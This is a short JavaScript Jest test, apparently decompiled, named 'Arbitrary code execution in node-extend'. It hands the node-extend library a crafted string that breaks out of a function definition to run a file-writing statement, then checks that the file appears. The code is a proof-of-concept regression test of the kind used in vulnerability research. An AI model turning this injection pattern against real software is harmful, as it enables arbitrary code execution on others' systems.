const v17 = () => {
    const v10 = expect.assertions(2);
    v10;
    const fs = require('fs');
    const extend = require('node-extend');
    const path = './node-extend';
    file_exist = fs.existsSync(path);
    const v11 = expect(file_exist);
    const v12 = v11.toBe(false);
    v12;
    try {
        foo = extend('function (){});require(`fs`).writeFileSync(\'node-extend\',\'\'); //(){console.log(123)}', '');
    } catch (error) {
    }
    file_exist = fs.existsSync(path);
    const v13 = expect(file_exist);
    const v14 = v13.toBe(true);
    v14;
    const v15 = function (err) {
    };
    const v16 = fs.unlink(path, v15);
    v16;
};
const v18 = test('Arbitrary code execution in node-extend', v17);
v18;